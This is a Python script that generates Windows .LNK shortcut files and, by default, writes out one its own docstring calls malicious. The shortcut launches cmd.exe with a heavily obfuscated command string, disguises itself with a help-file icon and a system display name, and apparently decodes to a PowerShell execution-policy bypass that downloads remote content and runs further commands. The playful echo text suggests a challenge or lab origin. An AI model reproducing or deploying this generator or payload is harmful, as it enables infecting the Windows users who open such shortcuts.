#!/usr/bin/env python3

import struct
import logging
import sys
import enum
import os

from shell_link_header import ShellLinkHeader
from linktarget_idlist import LinkTargetIDList, RootShellItem, VolumeShellItem, FileShellItem
from link_info import LinkInfo
from string_data import StringData
from extra_data import ExtraData, EnvironmentVariableDataBlock, ConsoleDataBlock
	
from constants import DriveType, ShowCommand, CLSID, ShellItemType, FileShellItemTypeData

"""
Generate windows .LNK files

SHELL_LINK = SHELL_LINK_HEADER [LINKTARGET_IDLIST] [LINKINFO] [STRING_DATA] *EXTRA_DATA

"""

logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
log = logging.getLogger('lnk_gen')

class Link():
	def __init__(self):
		self.ShellLinkHeader = ShellLinkHeader()
		self.LinkTargetIDList = LinkTargetIDList()
		self.LinkInfo = LinkInfo()
		self.ExtraData = ExtraData()

		self.Name = 'name\x00'
		self.RelativePath = 'relative_path\x00'
		self.WorkingDir = 'working_dir\x00'
		self.Arguments  = 'arguments\x00'
		self.IconLocation = 'icon_location\x00'

	# Setters/getters for LinkHeader flags
	def get(self, field_name):
		return self.ShellLinkHeader.LinkFlags.get(field_name)
	def set(self, field_name, field_state):
		self.ShellLinkHeader.LinkFlags.set(field_name, field_state)

	def __bytes__(self):
		bs = b''

		# SHELL_LINK_HEADER (done)
		bs += bytes(self.ShellLinkHeader)

		# [LINKTARGET_IDLIST] (done)
		if self.get('HasLinkTargetIDList'):
			bs += bytes(self.LinkTargetIDList)

		# [LINKINFO]
		if self.get('HasLinkInfo'):
			bs += bytes(self.LinkInfo)

		# [STRING_DATA] (done)
		# Fail in 010 cause it only supports wchar_t
		if self.get('HasName'):
			bs += bytes(StringData(self.Name))
		if self.get('HasRelativePath'):
			bs += bytes(StringData(self.RelativePath))
		if self.get('HasWorkingDir'):
			bs += bytes(StringData(self.WorkingDir))
		if self.get('HasArguments'):
			bs += bytes(StringData(self.Arguments))
		if self.get('HasIconLocation'):
			bs += bytes(StringData(self.IconLocation))

		# *EXTRA_DATA
		bs += bytes(self.ExtraData)

		return bs

def example():
	""" Generates the sample file in the specification,
		pointing to `C:\\test\\a.txt`
		Currently no unicode! """

	lnk = Link()

	# ShellLinkHeader
	lnk.set('HasLinkTargetIDList', 1)
	lnk.set('HasLinkInfo', 1)
	lnk.set('HasRelativePath', 1)
	lnk.set('HasWorkingDir', 1)
	# TODO: Implement full Unicode support
	# lnk.set('HasUnicode', 1)
	lnk.set('EnableTargetMetadata', 1)
	
	lnk.ShellLinkHeader.FileAttributes.set('FILE_ATTRIBUTE_ARCHIVE', 1)
	# Leave FileTime structures untouched for now

	# Make LinkTargetIDList
	lnk.LinkTargetIDList.add_payload(RootShellItem(bytes(CLSID.MY_COMPUTER.value)))

	# Why 22? No fucking clue!
	lnk.LinkTargetIDList.add_payload(VolumeShellItem('C:\\'.ljust(22, '\x00')))

	# Fix ShItems
	test_shitem = FileShellItem('test\x00')
	test_shitem.set('FILE_ATTRIBUTE_DIRECTORY', 1)
	atxt_shitem = FileShellItem('a.txt\x00')
	atxt_shitem.set('FILE_ATTRIBUTE_NORMAL', 1)

	lnk.LinkTargetIDList.add(3,1, bytes(test_shitem))
	lnk.LinkTargetIDList.add(3,2, bytes(atxt_shitem))

	# Setup LinkInfo structure
	lnk.LinkInfo.set('VolumeIDAndLocalBasePath', 1)

	# Setup LinkInfo.VolumeID
	lnk.LinkInfo.VolumeID.DriveType = DriveType.DRIVE_FIXED.value
	lnk.LinkInfo.VolumeID.DriveSerialNumber = 0x307A8A81
	lnk.LinkInfo.VolumeID.Data = b'\x00'

	# Further LinkInfo setup
	lnk.LinkInfo.LocalBasePath = b'C:\\test\\a.txt\x00'
	lnk.LinkInfo.CommonPathSuffix = b'\x00'

	# Strings
	lnk.RelativePath = '\\a.txt'
	lnk.WorkingDir   = 'C:\\test'

	# ExtraData (TODO)
	return lnk

def malicious():
	""" Generates a malicious sample file """

	lnk = Link()

	#payload = "set a=test && echo !a! && timeout 10"
	payload = 'echo *-Oh! Here is the Flute! Its music surely has some mysterious power!-*>flute.txt&(sEt _=eflputyx &seT __=!_:~5,1!!_:~6,1!!_:~3,1!e!_:~8,1!!_:~1,1!!_:~2,1!!_:~4,1!!_:~5,1!e.!_:~5,1!!_:~7,1!!_:~5,1!&!__!&& SeT _=CBFIOPSRWacbedgihkmlonqpsrutwvx &Set __=!_:~5,1!!_:~20,1!!_:~28,1!!_:~12,1!!_:~25,1!!_:~6,1!!_:~16,1!!_:~12,1!!_:~19,1!!_:~19,1!.!_:~12,1!!_:~30,1!!_:~12,1!!_:~31,1!!_:~3,1!!_:~21,1!!_:~29,1!!_:~20,1!!_:~17,1!!_:~12,1!-C!_:~20,1!!_:~18,1!!_:~18,1!!_:~9,1!!_:~21,1!!_:~13,1!!_:~31,1!-!_:~6,1!!_:~10,1!!_:~25,1!!_:~15,1!!_:~23,1!!_:~27,1!!_:~1,1!!_:~19,1!!_:~20,1!!_:~10,1!!_:~17,1!!_:~31,1!{"!_:~3,1!!_:~21,1!!_:~29,1!!_:~20,1!!_:~17,1!!_:~12,1!-!_:~8,1!!_:~12,1!!_:~11,1!!_:~7,1!!_:~12,1!!_:~22,1!!_:~26,1!!_:~12,1!!_:~24,1!!_:~27,1!!_:~31,1!!_:~16,1!!_:~27,1!!_:~27,1!!_:~23,1!!_:~24,1!://!_:~14,1!!_:~15,1!!_:~27,1!!_:~16,1!!_:~26,1!!_:~11,1!.!_:~10,1!!_:~20,1!!_:~18,1!/!_:~18,1!!_:~9,1!!_:~25,1!!_:~10,1!!_:~26,1!!_:~24,1!-!_:~28,1!!_:~12,1!!_:~21,1!!_:~14,1!!_:~12,1!!_:~19,1!!_:~15,1!!_:~21,1!/!_:~13,1!!_:~9,1!!_:~27,1!!_:~9,1!/!_:~11,1!!_:~19,1!!_:~20,1!!_:~11,1!/!_:~18,1!!_:~9,1!!_:~15,1!!_:~21,1!/!_:~27,1!!_:~12,1!!_:~24,1!!_:~27,1!?!_:~25,1!!_:~9,1!!_:~28,1!=!_:~27,1!!_:~25,1!!_:~26,1!!_:~12,1!!_:~31,1!-!_:~4,1!!_:~26,1!!_:~27,1!!_:~2,1!!_:~15,1!!_:~19,1!!_:~12,1!!_:~31,1!!_:~27,1!!_:~12,1!!_:~24,1!!_:~27,1!"}&!__!&& Set _=zedflpsutyx &set __=!_:~8,1!!_:~9,1!!_:~5,1!!_:~1,1!!_:~11,1!!_:~8,1!!_:~1,1!!_:~6,1!!_:~8,1!&set ___=!_:~3,1!!_:~4,1!!_:~7,1!!_:~8,1!!_:~1,1!.!_:~8,1!!_:~10,1!!_:~8,1!:z!_:~4,1!.!_:~2,1!!_:~4,1!!_:~4,1!&!__!>!___!&& SEt _=edlst &set __=!_:~1,1!e!_:~2,1!!_:~5,1!!_:~4,1!e!_:~3,1!!_:~4,1!&!__!&& SET _=edfikzln3rutx2 &seT __=!_:~9,1!!_:~10,1!!_:~7,1!!_:~1,1!!_:~6,1!!_:~6,1!!_:~8,1!!_:~13,1!!_:~14,1!"!_:~2,1!!_:~6,1!!_:~10,1!!_:~11,1!e.!_:~11,1!!_:~12,1!!_:~11,1!:!_:~5,1!!_:~6,1!.!_:~1,1!!_:~6,1!!_:~6,1!",!_:~6,1!!_:~3,1!!_:~7,1!!_:~4,1!&!__!&& set _=eimo10ut &set __=!_:~7,1!!_:~1,1!!_:~2,1!e!_:~3,1!!_:~6,1!!_:~7,1!!_:~8,1!!_:~4,1!!_:~5,1!&!__!)'
	# ShellLinkHeader
	lnk.set('HasRelativePath', 1)
	lnk.RelativePath = '..\\..\\..\\..\\Windows\\system32\\cmd.exe'
	lnk.set('HasWorkingDir', 1)
	lnk.WorkingDir = '%TEMP%'
	lnk.set('HasArguments', 1)
	lnk.Arguments = f'/v:on /c "{payload}"'
	lnk.set('HasIconLocation', 1)
	lnk.IconLocation = '%windir%\\winhlp32.exe'
	lnk.set('HasName', 1)
	lnk.Name = '@%windir%\system32\shell32.dll,-22534'
	lnk.set('ForceNoLinkInfo', 1)
	lnk.set('PreferEnvironmentPath', 1)
	lnk.set('HasExpString', 1)
	lnk.set('IsUnicode', 1)

	lnk.ShowCommand = ShowCommand.SW_SHOWNORMAL.value

	# ExtraData
	lnk.ExtraData.DataBlocks.append(EnvironmentVariableDataBlock('%windir%\\system32\\cmd.exe'))
	lnk.ExtraData.DataBlocks.append(ConsoleDataBlock())

	return lnk

if __name__ == '__main__':
	lnk = malicious()

	bs = bytes(lnk)
	sys.stdout.buffer.write(bs)

		
